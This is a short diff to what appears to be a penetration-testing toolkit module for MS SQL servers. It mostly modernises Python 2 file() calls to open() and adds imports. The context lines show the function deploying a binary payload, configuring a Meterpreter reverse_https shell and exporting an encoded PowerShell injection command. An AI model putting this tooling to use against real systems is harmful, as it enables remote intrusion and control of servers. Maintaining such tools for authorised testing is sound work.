@@ -5,7 +5,9 @@ import binascii
 import os
 import shutil
 import subprocess
+import thread
 import time
+import pexpect
 import src.core.setcore as core
 import impacket.tds as tds
 
@@ -174,7 +176,7 @@ def deploy_hex2binary(ipaddr, port, username, password):
             web_path = None
 
             #prep_powershell_payload()
-            import src.core.payloadgen.create_payloads 
+            import src.core.payloadgen.create_payloads
 
             # if we are using a SET interactive shell payload then we need to make
             # the path under web_clone versus ~./set
@@ -242,7 +244,7 @@ def deploy_hex2binary(ipaddr, port, username, password):
 
         #with open(os.path.join(core.userconfigpath, "payload_options.shellcode"), "w") as filewrite:
         # format needed for shellcode generation
-        filewrite = file(core.userconfigpath + "payload_options.shellcode", "w")
+        filewrite = open(core.userconfigpath + "payload_options.shellcode", "w")
         filewrite.write("windows/meterpreter/reverse_https {0},".format(port))
         filewrite.close()
 
@@ -256,8 +258,8 @@ def deploy_hex2binary(ipaddr, port, username, password):
         if not os.path.isdir(os.path.join(core.userconfigpath, "reports/powershell")):
             os.makedirs(os.path.join(core.userconfigpath, "reports/powershell"))
 
-        x86 = file(core.userconfigpath + "x86.powershell").read().rstrip()
-        x86 = core.powershell_encodedcommand(x86) 
+        x86 = open(core.userconfigpath + "x86.powershell").read().rstrip()
+        x86 = core.powershell_encodedcommand(x86)
         core.print_status("If you want the powershell commands and attack, "
                           "they are exported to {0}".format(os.path.join(core.userconfigpath, "reports/powershell")))
         filewrite = open(core.userconfigpath + "reports/powershell/x86_powershell_injection.txt", "w")
